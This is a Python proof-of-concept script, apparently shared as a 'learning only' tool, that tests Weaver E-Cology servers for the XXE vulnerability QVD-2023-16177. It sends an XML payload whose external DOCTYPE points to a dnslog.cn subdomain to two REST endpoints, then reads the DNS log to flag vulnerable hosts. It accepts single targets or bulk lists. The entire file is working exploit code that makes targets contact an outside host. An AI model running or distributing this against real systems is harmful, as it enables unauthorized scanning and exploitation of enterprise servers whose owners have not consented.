import requests
import argparse
import time

requests.packages.urllib3.disable_warnings()
cookie = ""
headers_dnslog = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
    "Cookie": cookie
}


def Banner():
    banner = """


  ______             _____           _                            __   __ __   __  ______                        
 |  ____|           / ____|         | |                           \ \ / / \ \ / / |  ____|                       
 | |__     ______  | |        ___   | |   ___     __ _   _   _     \ V /   \ V /  | |__                          
 |  __|   |______| | |       / _ \  | |  / _ \   / _` | | | | |     > <     > <   |  __|                         
 | |____           | |____  | (_) | | | | (_) | | (_| | | |_| |    / . \   / . \  | |____                        
 |______|           \_____|  \___/  |_|  \___/   \__, |  \__, |   /_/ \_\ /_/ \_\ |______|                       
                                                  __/ |   __/ |                                                  
   ____   __      __  _____             ___     _____/ ______/____             __     __    __   ______   ______ 
  / __ \  \ \    / / |  __ \           |__ \   / _ \  |__ \  |___ \           /_ |   / /   /_ | |____  | |____  |
 | |  | |  \ \  / /  | |  | |  ______     ) | | | | |    ) |   __) |  ______   | |  / /_    | |     / /      / / 
 | |  | |   \ \/ /   | |  | | |______|   / /  | | | |   / /   |__ <  |______|  | | | '_ \   | |    / /      / /  
 | |__| |    \  /    | |__| |           / /_  | |_| |  / /_   ___) |           | | | (_) |  | |   / /      / /   
  \___\_\     \/     |_____/           |____|  \___/  |____| |____/            |_|  \___/   |_|  /_/      /_/    

                                                tag:  泛微E-Cology XXE QVD-2023-16177 漏洞 POC                                       
                                                                    @version: 1.0.0   @author by ghhycsec                                           

    仅限学习使用，请勿用于非法测试！

    """
    print(banner)


def dnslog_req():
    try:
        req = requests.get("http://www.dnslog.cn/getdomain.php?t=0.3788026823137127", headers=headers_dnslog,
                           timeout=10)
        time.sleep(3)
        return req.text
    except:
        print("请求发生错误，请查看 http://www.dnslog.cn/ 是否可访问")
        exit(-1)


def dnslog_res(url):
    try:
        response_dnslog = requests.get("http://www.dnslog.cn/getrecords.php?t=0.3788026823137127",
                                       headers=headers_dnslog, timeout=10)
        if (len(response_dnslog.text) != 2):
            print("%s\t存在漏洞" % (url))
        else:
            print("%s不存在漏洞" % (url))
    except Exception as e:
        # print(e)
        print("请求发生错误，请查看 http://www.dnslog.cn/ 是否可访问")


def poc(url, dnslog_str):
    if "http" not in url:
        url = "http://" + url
    data = '''<?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE syscode SYSTEM "http://''' + dnslog_str + '''/1.txt">
    <M><syscode>&send;</syscode></M>
    '''

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
        "Content-Type": "application/xml"
    }
    try:
        requests.post(url + "/rest/ofs/ReceiveCCRequestByXml", headers=headers, data=data, timeout=5, verify=False)
        requests.post(url + "/rest/ofs/deleteUserRequestInfoByXml", headers=headers, data=data, timeout=5,
                      verify=False)
    except Exception as e:
        pass




if __name__ == '__main__':
    Banner()
    parser = argparse.ArgumentParser(
        description="QVD-2023-16177 检测工具 使用公共dnslog来验证泛微E-Cology XXE QVD-2023-16177 漏洞 ")
    parser.add_argument("-u", "--target", help="单个目标URL")
    parser.add_argument("-f", "--file", help="包含多个目标URL的文件")
    parser.add_argument("-c", "--cookie", help="使用前 请查看 http://www.dnslog.cn/ 是否可访问")
    args = parser.parse_args()
    cookie = args.cookie  # 获得输入的 http://www.dnslog.cn/ cookie
    if cookie == None:
        print("请加上-c 参数")
        exit(-1)
    if args.target:
        target_urls = [args.target]
    elif args.file:
        with open(args.file, "r") as fp:
            target_urls = fp.read().splitlines()
    else:
        print("请使用 -u 或 -f 指定目标")
        exit(-1)

    dnslog = dnslog_req()
    for url in target_urls:
        poc(url, dnslog)
        dnslog_res(url)
